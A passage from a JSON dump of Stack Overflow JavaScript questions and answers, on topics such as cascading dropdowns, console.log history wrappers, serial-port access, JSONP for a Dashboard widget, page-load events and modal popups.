[DisplayName(\"Banner Timeout\")]\n    public int BannerTimeout { get; set; }\n\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        Session.Add(\"timeout\", (BannerTimeout*1000));\n    }\n}\n</code></pre>\n\n<p>This achieved what I was looking for, and maybe this method can help someone else out.</p>\n",
            "last_activity_date": 1349599841,
            "question_id": 1343801,
            "score": 4,
            "tags": [
                "javascript",
                "jquery",
                "sitefinity"
            ],
            "title": "Pass variable to external JS file?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>Because you tagged your question with \"jquery\", <a href=\"http://plugins.jquery.com/project/DependentSelect\" rel=\"nofollow\">here</a> is an example of a \"Depending / Cascading Selectbox\" (which you are searching)</p>\n\n<p><a href=\"http://www.ajaxray.com/Examples/depend.html\" rel=\"nofollow\">Demo</a></p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>The <a href=\"http://www.asp.net/AJAX/AjaxControlToolkit/Samples/CascadingDropDown/CascadingDropDown.aspx\" rel=\"nofollow\">CascadingDropdown</a> control will give you this behavior.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Well it's based on your IP tracking, you can find users country via his IP address, all the list of Cities, for specific countries you can find somewhere and add it to your functionality, also you probably need some ajax functions for filing up drop downs or even better a JSON.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You have to use Javascript to <a href=\"http://www.petenelson.com/aspwatch/ASPWatch%20%20Using%20Javascript%20to%20Dynamically%20Populate%20Select%20Lists.htm\" rel=\"nofollow\">dynamically populate</a> the city/state SELECT tag whenever the country SELECT tag is changed, which you can catch using an <a href=\"http://wsabstract.com/javatutors/event1.shtml\" rel=\"nofollow\">Event Handler</a>.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Regarding the data: <a href=\"http://stackoverflow.com/questions/121117/country-state-province-webservice\">Country, State, Province WebService?</a></p>\n",
                    "is_accepted": true,
                    "score": 2
                }
            ],
            "body": "<p>If you go to <a href=\"http://profile.microsoft.com\" rel=\"nofollow\">http://profile.microsoft.com</a> and edit your personal information, you will select your country. When a country is selected the city and/or state information changes based on what is expected for that country. Does anyone have any examples on how to accomplish this? Is there any service (free service) that provides this information?</p>\n",
            "last_activity_date": 1249592109,
            "question_id": 1241347,
            "score": 4,
            "tags": [
                "javascript",
                "jquery",
                "html",
                "ajax",
                "dhtml"
            ],
            "title": "Country/State Dynamic Drop Down List"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>Could you rewrite the <code>console.log()</code>, and append all logs to an array? Then fire up the original <code>console.log()</code> and repeat what it's doing to get your debug output on the console?</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>You could overwrite the <code>console.log</code> function to add whatever extra functionality you need.</p>\n\n<pre><code>var oldLog = console.log;\nvar lastLog;\nconsole.log = function () {\n    // do whatever you need to do here: store the logs into a different variable, etc\n    // eg:\n    lastLog = arguments;\n\n    // then call the regular log command\n    oldLog.apply(console, arguments);\n};\n</code></pre>\n\n<p>This won't be the most bulletproof solution, since <code>console</code> allows printf style syntax:</p>\n\n<pre><code>console.log(\"%d + %d = %s\", 1, 3, \"four\");\n</code></pre>\n\n<p>...but it's probably a start for you.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>Don't try and override console.debug, implement a function that does console.debug plus what you need.</p>\n\n<pre><code>var debugCalls = [ ];\nfunction myDebug(errorMessage){\n  console.debug(errorMessage); //maintain original functionality\n  debugCalls[debugCalls.length]  = errorMessage;\n  //the previous argument to myDebug is debugCalls[debugCalls.length]\n\n  //you may also want to call an ajax function to report this error\n  mailError(errorMessage);\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>You might wanna implement a queue. Expanding on Devin's answer: (something like this)</p>\n\n<pre><code>var window.log = [];\n\nlogger function(msg) {\n  var log_length = 10;\n  console.log(msg);\n  window.log.push(msg);\n  if(window.log.length &gt; log_length) {\n    window.log.shift()\n  }\n}\n</code></pre>\n\n<p>See:<br>\n<a href=\"http://stackoverflow.com/questions/1590247/how-do-you-implement-a-stack-and-a-queue-in-javascript\">How do you implement a Stack and a Queue in JavaScript?</a><br>\n<a href=\"http://aymanh.com/9-javascript-tips-you-may-not-know#string-concatenation-vs-arrayjoin\" rel=\"nofollow\">http://aymanh.com/9-javascript-tips-you-may-not-know#string-concatenation-vs-arrayjoin</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Here's a more elaborate version I put together:</p>\n\n<pre><code>/**\n * Console log with memory\n *\n * Example:\n *\n *     console.log(1);\n *     console.history[0]; // [1]\n *\n *     console.log(123, 456);\n *     console.history.slice(-1)[0]; // [123, 456]\n *\n *     console.log('third');\n *     // Setting the limit immediately trims the array,\n *     // just like .length (but removes from start instead of end).\n *     console.history.limit = 2;\n *     console.history[0]; // [123, 456], the [1] has been removed\n *\n * @author Timo Tijhof, 2012\n */\nconsole.log = (function () {\n    var log  = console.log,\n        limit = 10,\n        history = [],\n        slice = history.slice;\n\n    function update() {\n        if (history.length &gt; limit) {\n            // Trim the array leaving only the last N entries\n            console.history.splice(0, console.history.length - limit);\n        }\n    }\n\n    if (console.history !== undefined) {\n        return log;\n    }\n\n    Object.defineProperty(history, 'limit', {\n        get: function () { return limit; },\n        set: function (val) {\n            limit = val;\n            update();\n        }\n    });\n\n    console.history = history;\n\n    return function () {\n        history.push(slice.call(arguments));\n        update();\n        return log.apply(console, arguments);\n    };\n\n}());\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I'm looking for a way to read the most recent command that was logged to the firebug console.</p>\n\n<p>For example, I could have something that does</p>\n\n<pre><code>console.debug('The most current request URI is /sweatsocks');\n</code></pre>\n\n<p>And then another piece of (pseudo)code could then</p>\n\n<pre><code>if (mostRecentConsoleEntry().endsWith('/sweatsocks')) {\n  // do some stuff\n}\n</code></pre>\n\n<p>The context being the debug statement would be in the code under test, and the console checking would be done inside a selenium script. This would let me observe information buried deep in js functions as well as stuff that is built at runtime.</p>\n",
            "last_activity_date": 1365994968,
            "question_id": 601363,
            "score": 4,
            "tags": [
                "javascript",
                "selenium",
                "firebug"
            ],
            "title": "reading the firebug console in javascript"
        },
        {
            "answer_count": 9,
            "answers": [
                {
                    "body": "<p>I think you'll need to add a Java or Active-X layer in between. JavaScript is pretty well isolated (deliberately) from the OS.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>You could try looking at something like V8 and writing a small wrapper for the C library to expose to the VM.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>You need a RS-232 ActiveX component that you install on the system and then create an object from in the javascript code in your sidebar widget. Note that there is no standard to create objects from ActiveX components, this is only available in JScript, Microsoft's implementation of the language we all know as Javascript.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Do you like convoluted hacks?</p>\n\n<p>Install a webserver.  Use CGI, Python, PHP, Perl, or some other method to control the serial port from a page on the webserver.</p>\n\n<p>Point the control at the webpage.</p>\n\n\n",
                    "is_accepted": false,
                    "score": 7
                },
                {
                    "body": "<p>I don't have a solution, but here could be a start of one.</p>\n\n<ol>\n<li>Signed java applet would give you access to the system</li>\n<li>Use RXTX (Java Serial COM API) to connect to serial ports</li>\n<li>Applet would need to install files to the jre/ext folder.  Restart the app after doing so.</li>\n</ol>\n\n<p>Now if you're running the javascript from your own machine you could use <a href=\"http://en.wikipedia.org/wiki/HTML%5FApplication\" rel=\"nofollow\">HTA</a> to have full access to the system.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Javascript in particular, or just from the browser with some method? And which browser? (IE or Firefox?) Firefox plugins using XUL + javascript are pretty easy, although you'd still have to implement something in XPCOM (the Mozilla equivalent of ActiveX/COM) to work the RS232.</p>\n\n<p>Alternatively you could use <a href=\"http://www.jsdb.org\" rel=\"nofollow\">JSDB</a> as an impromptu web server (on an alternate port of the local machine). It's ridiculously easy to use the RS232 port in JSDB:</p>\n\n<pre><code>c:\\&gt;jsdb\njs&gt;S=new Stream('com1://115200');\ncom1\njs&gt;S.write('\\x00');    // send ASCII character 0 to the serial port\n1\njs&gt;\n</code></pre>\n\n<p>So your browser-side implementation could just be whatever your favorite bookmark/link/thingy is that links to <code>http://localhost:9999/comport/1</code> where 9999 is the port # JSDB is listening to, and \"1\" is the serial port switch.  The JSDB code would listen to the port and send the appropriate RS232 command after parsing a GET request from the browser.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>I'm sorry to be posting under my own question- I hadn't registered, so now I cannot edit it.</p>\n\n<p>I wanted to implement a Vista Sidebar Gadget for the task.  unfortunately it looks like those are just basically html documents with javascript, so it doesn't look like that is going to be a good solution for me. I'll probably just write a little .Net application or something.</p>\n\n<p>Thank you for all of your input though.  If any one still has ideas, I'll take them.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>AFAIK, Vista gadget's runtime supports the use of signed ActiveX controls.  You may also be able to use Java.  You can create an ActiveX wrapper to .Net which has a fair amount of support for serial devices.  For the most part ActiveX + Serial communications is limited to commercial controls.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p><a href=\"http://realterm.sourceforge.net/\" rel=\"nofollow\">RealTerm</a> has an extensive COM interface and is easy to control from JavaScript on windows.  The <a href=\"http://sourceforge.net/projects/realterm/files/\" rel=\"nofollow\">SourceForge downloads page</a> has version 2.0.0.57, and <a href=\"http://www.i2cchip.com/realterm\" rel=\"nofollow\">i2cchip.com</a>\nhas a version 2.0.0.70.</p>\n\n<p>There is a JavaScript example in the \"examples\" subdirectory which is installed by default.</p>\n\n<p>Sadly, the JavaScript examples appear to have been removed from later versions<a href=\"http://sourceforge.net/projects/realterm/files/z_Examples/1.0/\" rel=\"nofollow\">4</a> It may still be possible to do it, but there are no examples.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I am currently working on a project that involves a 4 Port A/V switch.  This switch can be controlled via RS-232.</p>\n\n<p>The computer that will interface with the switch runs Vista.  I would like to create a sidebar gadget that has 4 buttons- 1 for each port on the switch.  When the user presses the button, it switches to that port.  </p>\n\n<p>I have done a bit of googling, and it seems that there isn't a very good way to interface between javascript and rs-232.</p>\n\n<p>Does anyone have any suggestions for me?</p>\n\n<p>Thanks!</p>\n",
            "last_activity_date": 1350065337,
            "question_id": 592099,
            "score": 4,
            "tags": [
                "javascript",
                "serial-port",
                "windows-vista"
            ],
            "title": "Javascript interface with RS-232 Serial Port"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>Interesting that it works in Safari. As far as I know to do x-domain ajax requests you need to use the jsonp dataType.</p>\n\n<p><a href=\"http://docs.jquery.com/Ajax/jQuery.getJSON\" rel=\"nofollow\">http://docs.jquery.com/Ajax/jQuery.getJSON</a></p>\n\n<p><a href=\"http://bob.pythonmac.org/archives/2005/12/05/remote-json-jsonp/\" rel=\"nofollow\">http://bob.pythonmac.org/archives/2005/12/05/remote-json-jsonp/</a></p>\n\n<p>Basically you need to add <code>callback=?</code> to your query string and jquery will automatically replace it with the correct method eg:</p>\n\n<pre><code>$.getJSON(\"http://example.com/getData.php?act=data&amp;callback=?\",function(){ ... });\n</code></pre>\n\n<p>EDIT: put the <code>callback=?</code> bit at the end of the query string just to be safe.</p>\n",
                    "is_accepted": false,
                    "score": -2
                },
                {
                    "body": "<p>Cross-domain Ajax requests ( Using the XMLHttpRequest / ActiveX object ) are not allowed in the current standard, as per the <a href=\"http://www.w3.org/TR/XMLHttpRequest/\" rel=\"nofollow\">W3C spec</a>:</p>\n\n<blockquote>\n  <p>This specification does not include\n  the following features which are being\n  considered for a future version of\n  this specification:</p>\n  \n  <ul>\n  <li>Cross-site XMLHttpRequest;</li>\n  </ul>\n</blockquote>\n\n<p>However there's 1 technique of doing <em>ajax</em> requests cross-domain, <a href=\"http://bob.pythonmac.org/archives/2005/12/05/remote-json-jsonp/\" rel=\"nofollow\">JSONP</a>, by including a script tag on the page, and with a little server configuration.</p>\n\n<p>jQuery supports <a href=\"http://docs.jquery.com/Ajax/jQuery.getJSON\" rel=\"nofollow\">this</a>, but instead of responding on your server with this</p>\n\n<pre><code>{\"message\":\"Hello World\",\"version\":\"1.0\"}\n</code></pre>\n\n<p>you'll want to respond with this:</p>\n\n<pre><code>myCallback({\"message\":\"Hello World\",\"version\":\"1.0\"});\n</code></pre>\n\n<p><strong>myCallback</strong> must be the value in the \"callback\" parameter you passed in the $.getJSON() function. So if I was using PHP, this would work:</p>\n\n<pre><code>echo $_GET[\"callback\"].'({\"message\":\"Hello World\",\"version\":\"1.0\"});';\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>If you are creating a dashboard widget, why don't you use the XMLHttpRequest Setup function in the code library of DashCode.  Apple built these in so you don't need to install 3rd party JS libraries. I'm not sure about JSON support but perhaps starting here will lead you in a better direction.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<blockquote>\n  <p>Apple has some kind of external URL block in place.</p>\n</blockquote>\n\n<p>In your Info.plist you need to have the key AllowNetworkAccess set to true. </p>\n\n<pre><code>&lt;key&gt;allowNetworkAccess&lt;/key&gt;\n&lt;true/&gt;\n</code></pre>\n\n<p>Your code works in Safari because it is not constrained in the dashboard sever and it is not standards complient in that it DOES allow cross site AJAX. FF IS standards complient in that it DOES NOT allow cross site ajax.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>In Dashcode click <strong>Widget Attributes</strong> then <strong>Allow Network Access</strong> make sure that option is checked. I've built something that simply refused to work, and this was the solution.</p>\n",
                    "is_accepted": true,
                    "score": 7
                }
            ],
            "body": "<p>Hey everyone, I'm working on a widget for Apple's Dashboard and I've run into a problem while trying to get data from my server using jquery's ajax function. Here's my javascript code:</p>\n\n<pre><code>$.getJSON(\"http://example.com/getData.php?act=data\",function(json) { \n    $(\"#devMessage\").html(json.message)\n    if(json.version != version) {\n        $(\"#latestVersion\").css(\"color\",\"red\")\n    }\n    $(\"#latestVersion\").html(json.version)\n})\n</code></pre>\n\n<p>And the server responds with this json:</p>\n\n<pre><code>{\"message\":\"Hello World\",\"version\":\"1.0\"}\n</code></pre>\n\n<p>For some reason though, when I run this the fields on the widget don't change. From debugging, I've learned that the widget doesn't even make the request to the server, so it makes me think that Apple has some kind of external URL block in place. I know this can't be true though, because many widgets phone home to check for updates.</p>\n\n<p>Does anyone have any ideas as to what could be wrong?</p>\n\n<p>EDIT: Also, this code works perfectly fine in Safari.</p>\n\n<p><hr />\nAs requested by Luca, here's the PHP and Javascript code that's running right now:</p>\n\n<p>PHP:</p>\n\n<pre><code>echo $_GET[\"callback\"].'({\"message\":\"Hello World\",\"version\":\"1.0\"});';\n</code></pre>\n\n<p>Javascript:</p>\n\n<pre><code>function showBack(event)\n{\nvar front = document.getElementById(\"front\");\nvar back = document.getElementById(\"back\");\n\nif (window.widget) {\n    widget.prepareForTransition(\"ToBack\");\n}\n\nfront.style.display = \"none\";\nback.style.display = \"block\";\nstopTime();\nif (window.widget) {\n    setTimeout('widget.performTransition();', 0);\n}\n$.getJSON('http://nakedsteve.com/data/the-button.php?callback=?',function(json) { \n\t$(\"#devMessage\").html(json.message)\n    if(json.version != version) {\n        $(\"#latestVersion\").css(\"color\",\"red\")\n    }\n    $(\"#latestVersion\").html(json.version)\n})\n}\n</code></pre>\n",
            "last_activity_date": 1242752350,
            "question_id": 570100,
            "score": 4,
            "tags": [
                "javascript",
                "jquery",
                "ajax",
                "widget",
                "dashboard"
            ],
            "title": "Dashboard Cross-domain AJAX with jquery"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>In Javascript, you have the <a href=\"http://www.w3schools.com/jsref/jsref_onload.asp\" rel=\"nofollow\">onload</a> event.</p>\n\n<p>Edit: an example:</p>\n\n<pre><code>&lt;html&gt;\n  &lt;head&gt;...&lt;/head&gt;\n  &lt;body onload=\"doSomethingWhenPageIsLoaded();\"&gt;\n    ...\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Javascript's OnLoad event for the body does what you want.</p>\n\n<pre><code>&lt;body onload=\"somefunc();\"&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Javascript using the <a href=\"http://www.w3schools.com/jsref/jsref_onload.asp\" rel=\"nofollow\">onLoad()</a> event, will wait for the page to be loaded before executing.</p>\n\n<pre><code>&lt;body onload=\"somecode();\" &gt;\n</code></pre>\n\n<p>If you're using the jQuery framework's document ready function the code will load as soon as the DOM is loaded and before the page contents are loaded:</p>\n\n<pre><code>$(document).ready(function() {\n    // jQuery code goes here\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>You would use javascript to do this.  If you don't know how to use javascript, I would recommend reading through <a href=\"http://www.w3schools.com/js/default.asp\">some</a> <a href=\"https://developer.mozilla.org/en/A_re-introduction_to_JavaScript\">tutorials</a> <a href=\"http://eloquentjavascript.net/contents.html\">first</a>.</p>\n\n<p>After you have a basic understanding of javascript, you can detect when a page has loaded by using the <code>window.onload</code> event.</p>\n\n<pre><code>window.onload = function() {\n  addPageContents();  //example function call.\n}\n</code></pre>\n\n<p>Edit:  If you want to add more than one onload function, and not use a javascript library, you can wrap your own onload hanlder.</p>\n\n<pre><code>window.whenloaded = function(fn) {\n  if (window.onload) {\n    var old = window.onload;\n    window.onload = function() {\n      old();\n      fn();\n    }\n  } else {\n    window.onload = fn;\n  }\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 13
                },
                {
                    "body": "<p>Better than onload is to use a function of an existing framework, because onload does sometimes respond after all the resources (images and so on) are loaded and not only the page.</p>\n\n<p>For example jQuery:</p>\n\n<pre><code>$(document).ready( function() {\n    // do stuff\n})\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 12
                },
                {
                    "body": "<p>Why not use listeners?</p>\n\n<pre><code>// Everything but IE\nwindow.addEventListener(\"load\", function() {\n    // loaded\n}, false); \n\n// IE\nwindow.attachEvent(\"onload\", function() {\n    // loaded\n});\n</code></pre>\n\n<p>This way you can add as many Listeners as you want, you can also detach them! <code>removeEventListener</code> and <code>detachEvent</code>.</p>\n",
                    "is_accepted": false,
                    "score": 9
                }
            ],
            "body": "<p>I want to write an application that detects when a page is loaded in the browser, then I should be able to insert content on top of the loaded web page? Anybody with an idea on how to do that?</p>\n\n<p>Please note that I should be able to do this in any browser (Firefox/IE).</p>\n\n<p>What language should I use to help me do this?</p>\n\n<p>How do I detect this from an external application?</p>\n\n<p>How should I integrate this with the browser?</p>\n",
            "last_activity_date": 1399931548,
            "question_id": 520812,
            "score": 4,
            "tags": [
                "javascript",
                "html"
            ],
            "title": "How do I detect when a web page is loaded?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>A quick (maybe slightly computationally expensive) dirty hack would be something like: </p>\n\n<pre><code>$(\"body\").click(function() {\n\n    $(\".white_content\").each(function(){\n        if($(this).css(\"display\") !== \"none\")\n        { \n            $(this).hide();\n        }\n    });\n});\n</code></pre>\n\n<p><a href=\"http://jsfiddle.net/jb6h8/16/\" rel=\"nofollow\">Working fiddle</a>.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Try this:</p>\n\n<pre><code>  $(\"body\").click(function (e) {\n            var elt = $(e.target);\n    if (!($(e.target).attr(\"id\") == \"light\") &amp;&amp; !($(e.target).parents(\"div\").attr(\"id\")==\"light\"))\n            {\n                $(\"#light\").hide();\n            }\n        });\n</code></pre>\n\n<p>Its depends on your conditions. Anyways I have edited my post, you can check now.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>See this answer: <a href=\"http://stackoverflow.com/a/6144189/383904\">http://stackoverflow.com/a/6144189/383904</a></p>\n\n<hr>\n\n<p><strong><a href=\"http://jsbin.com/yisebe/1/edit\" rel=\"nofollow\">jsBin demo</a></strong></p>\n\n<p>The simplest way: </p>\n\n<pre><code> &lt;a data-pop=\"1\"&gt;Call popup 1&lt;/a&gt;\n\n &lt;div data-popup=\"1\"&gt;\n   &lt;h2&gt;\n     Popup 1 title\n     &lt;span data-pop&gt;&amp;times;&lt;/span&gt;\n   &lt;/h2&gt;\n   &lt;div&gt;\n     &lt;p&gt;Pop 1 description...&lt;/p&gt;\n     &lt;button data-pop&gt;OK&lt;/button&gt;\n   &lt;/div&gt;\n &lt;/div&gt;\n</code></pre>\n\n<p>CSS</p>\n\n<pre><code>/*** POPUP ***/\n[data-popup] {\n  display    : none;\n  position   : fixed;\n  z-index    : 9999;\n  right      : 0;\n  left       : 0;\n  margin     : 45px auto;  \n  width      : 50%;\n  min-width  : 200px;\n  padding    : 15px 25px 25px;\n  background : #fff;\n  transition: box-shadow 2s;\n  box-shadow : 0 0 0 1900px hsla(220,7%,18%,0.6),\n           0 10px 30px -5px hsla(220,7%,18%,0.6);\n}\n</code></pre>\n\n<p>jQuery:</p>\n\n<pre><code>// /////\n// POPUP\n\nvar $popup = $(\"[data-popup]\"),\n    pHov   = false;\n$popup.hover(function(){ pHov^=1; });\n$(document).mousedown(function(){\n  if(!pHov) $popup.slideUp(240); \n});\n\n$(\"[data-pop]\").click(function(){\n  var n = $(this).data('pop')\n  var $popup = n ? $(\"[data-popup='\"+n+\"']\") : $(this).closest(\"[data-popup]\");\n  $popup.slideToggle(240);\n});\n</code></pre>\n\n<p>The above will only fail if you have underneath your Popup an element that on <code>mousedown</code> (not <code>click</code>, just mousedown) uses <code>return false;</code> or <code>event.stopPropagation();</code>, in that case the click will not bubble up the DOM to reach <code>document</code> that triggers the popup hide.<br>\nso a better solution to create a modal window <strong><em>that works</em></strong> implies the <strong>use of a full-screen parent overlay window that contains the Modal</strong>.</p>\n\n<hr>\n\n<p><a href=\"http://jsbin.com/gokuf/5/edit\" rel=\"nofollow\">One of the common pitfalls creating modal / popups</a></p>\n\n<hr>\n\n<h3>Instead,</h3>\n\n<p>using a <strong>Modal-Parent</strong> window, all you need to do is register a click on that element in order to hide it (and his child <strong>Modal</strong>).<br>\nThan you can style that parent and add a nice opaque background or leave it transparent... it's up to your needs. Here's an example:</p>\n\n<p><strong><a href=\"http://jsbin.com/munor/3/edit\" rel=\"nofollow\">MODAL LIVE DEMO &laquo;</a></strong></p>\n\n<p><a href=\"/questions/tagged/html\" class=\"post-tag\" title=\"show questions tagged 'html'\" rel=\"tag\">html</a></p>\n\n<pre><code>  &lt;h1&gt;Modal window Test&lt;/h1&gt;\n\n  &lt;button class=\"modalOpen\"&gt;SHOW MODAL&lt;/button&gt;\n  &lt;p&gt;Some paragraph...&lt;/p&gt;\n\n  &lt;div id=\"modalOverlay\"&gt;\n    &lt;div id=\"modal\"&gt;\n      &lt;span class=\"modalClose\"&gt;&amp;times;&lt;/span&gt;\n      &lt;h3&gt;Modal&lt;/h3&gt;\n      &lt;button&gt;Some button to test inner propagation&lt;/button&gt;\n      &lt;button class=\"modalClose\"&gt;Close modal&lt;/button&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n</code></pre>\n\n<p><a href=\"/questions/tagged/css\" class=\"post-tag\" title=\"show questions tagged 'css'\" rel=\"tag\">css</a></p>\n\n<pre><code>#modalOverlay{\n  display:none;\n  position:fixed;\n  top:0;\n  left:0;\n  width:100%;\n  height:100%;\n  background:rgba(255,255,255,0.8);\n}\n#modal{\n  position:relative;\n  margin:100px auto;\n  background:#fff;\n  width:300px;\n  padding:30px;\n  box-shadow: 0 5px 50px -4px #aaa;\n}\n#modal span.modalClose{\n  cursor:pointer;\n  font-size:20px;\n  position:absolute;\n  right:20px;\n  top:15px;\n}\n</code></pre>\n\n<p><a href=\"/questions/tagged/jquery\" class=\"post-tag\" title=\"show questions tagged 'jquery'\" rel=\"tag\">jquery</a></p>\n\n<pre><code>var $modalOverlay = $('#modalOverlay'); // Cache your selectors\nvar $modal        = $('#modal');\nvar $modalClose   = $('.modalClose');\nvar $modalOpen    = $('.modalOpen');\n\n$modalOpen.click(function(){\n  $modalOverlay.stop().fadeTo(500,1);\n});\n\n$modalOverlay.click(function(){\n  $modalOverlay.stop().fadeTo(500,0, function(){ $(this).hide(); });\n});\n\n$modal.click(function( e ) {\n   e.stopPropagation(); // otherwise the click would bubble up to the overlay\n});\n\n$modalClose.click(function(){\n  $modalOverlay.click(); // simulate click to close modal\n});\n</code></pre>\n\n<p>to summarize, as you can see from the code-idea above we didn't used <code>document</code> or <code>body</code> to listen for <em>pop-up close</em> clicks, we rely exclusively on the modal elements.</p>\n",
                    "is_accepted": true,
                    "score": 1
                }
            ],
            "body": "<pre><code>&lt;a href=\"javascript:void(0)\" onclick = \"document.getElementById('light3').style.display='block';document.getElementById('fade').style.display='block'\"&gt;&lt;button type=\"button\" name=\"\" value=\"\" id=\"readmorelink3\"&gt;+&lt;span class=\"rmore\"&gt;Read More&lt;/span&gt;&lt;/button&gt;&lt;/a&gt;\n</code></pre>\n\n<p>I'm using the above DOM classic <code>onClick</code> to simply display divs as a simple pop-up. I have created a close button within the div but I would also like to have the open divs <code>hide</code> when the user clicks the <code>body</code> or anywhere that isn't the open div. I have tried absolutely everything -- </p>\n\n<p>My simple Overlay (1 of 3)</p>\n\n<pre><code>&lt;!-- read more overlays 1 --&gt;\n\n&lt;div id=\"light\" class=\"white_content\"&gt;\n\n&lt;a class=\"close\" href=\"javascript:void(0)\" onclick = \"document.getElementById('light').style.display='none';document.getElementById('fade').style.display='none'\" class=\"textright\" style=\"color: #DDD !important; float:right;\"&gt;CLOSE X&lt;/a&gt;\n\n&lt;h4&gt;[Hey+]&lt;/h4&gt;\n&lt;h3&gt;Demo&lt;/h3&gt;\n&lt;h3&gt;SUP&lt;/h3&gt;\n&lt;span&gt; 2.5 fl. oz.&lt;/span&gt;&lt;br&gt;\n&lt;br&gt;\n&lt;p&gt;\nCool content, about cool things.\n&lt;/p&gt;\n\n&lt;/div&gt;\n\n&lt;!-- // read more overlays 1--&gt;\n</code></pre>\n\n<p><em>I tried this guy:</em></p>\n\n<pre><code>$(document).click(function() {\n    $('#mydiv').fadeOut(300);\n});\n</code></pre>\n\n<p><em>I've messed with this guy:</em></p>\n\n<pre><code> if($('#mydiv').is(\":not(:visible)\") ){\n</code></pre>\n\n<p><em>// and visa versa if visible etc</em></p>\n\n<hr>\n\n<p>Also have tried.</p>\n\n<pre><code> // To prevent hide #menu when click on #main\n    $('#mydiv').click(function (e) {\n        e.stopPropagation();\n});\n\n // Click outsite of #menu\n    $('html').click(function () {\n    $('#mydiv').hide();\n});\n</code></pre>\n\n<p><em>Realizing I have should have done this with simple jQuery and not inline; but I don't want to redo everything so seeking DOM / JavaScript solution. Simply to close the open or display: block divs > when they are displayed, by in addition clicking outside of the element or on body tag.</em> </p>\n\n<p><em>EG</em>: DIV OVERLAY IS DISPLAYED > CLICK OUTSIDE OF ELEMENT AND IT CLOSES. I ADDED ONCLICK CLOSE BUTTON TO THE BODY TAG, BUT IT KILLED POPUP ENTIRELY, ADDED A WRAPPER, NO CIGAR.</p>\n",
            "last_activity_date": 1417017453,
            "question_id": 23283652,
            "score": 3,
            "tags": [
                "javascript"
            ],
            "title": "How to create a custom modal popup - and how to close it clicking outside of it"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Try using event delegation:</p>\n\n<p>Because fragment-1 does not exist at the time you are creating the handler, you assign the handler to the document and delegate it to any child elements called fragment-1 that exist now or will exist in the future.</p>\n\n<p>To make it more generic, you can assign classes to the div and delegate to the class instead of an id...</p>\n\n<blockquote>\n  <p><strong>UPDATE</strong></p>\n</blockquote>\n\n<p>You can't use changepage to go between tabs, instead use the tabs widget active property(<a href=\"http://api.jqueryui.com/tabs/#option-active\" rel=\"nofollow\">http://api.jqueryui.com/tabs/#option-active</a>):</p>\n\n<pre><code>$(document).on(\"pagecreate\", \"#page1\", function () {\n   $(\"#btngo\").on(\"click\", function(){\n        goToMatchDetailPage('Liverpool', 'Southhampton');    \n    });\n\n    $(document).on(\"swipeleft\", \"#fragment-1\", function(){    \n           $(this).parents(\"div [data-role=tabs]\").tabs( \"option\", \"active\", 1 );    \n    } );\n        $(document).on(\"swiperight\", \"#fragment-2\", function(){    \n           $(this).parents(\"div [data-role=tabs]\").tabs( \"option\", \"active\", 0 );    \n    } );         \n});\n</code></pre>\n\n<blockquote>\n  <p>Here is a <strong><a href=\"http://jsfiddle.net/ezanker/DZfBC/1/\" rel=\"nofollow\">DEMO</a></strong></p>\n</blockquote>\n\n<p>The swipe code is assigned to the document and then delegated to the dynamic div. When you swipe on a tab div, we find its parent that is the tab widget container and then set its active tab option to change tabs.</p>\n",
                    "is_accepted": true,
                    "score": 3
                },
                {
                    "body": "<p>try this simple code</p>\n\n<pre><code>$(document).on(\"swipeleft\", '#'+event.target.id, function () {\n                    var nextpage = $(this).next('div[data-role=\"page\"]');\n                    if (nextpage.length &gt; 0) {\n                        alert(nextpage.attr('id'));\n                        $.mobile.changePage(nextpage, \"slide\", false, true);\n                    }\n                });\n\n                $(document).on(\"swiperight\", '#'+event.target.id, function () {\n                    var prevpage = $(this).prev('div[data-role=\"page\"]');\n                    if (prevpage.length &gt; 0) {\n                        $.mobile.changePage(prevpage, { transition: \"slide\", reverse: true }, true, true);\n                    }\n                });\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
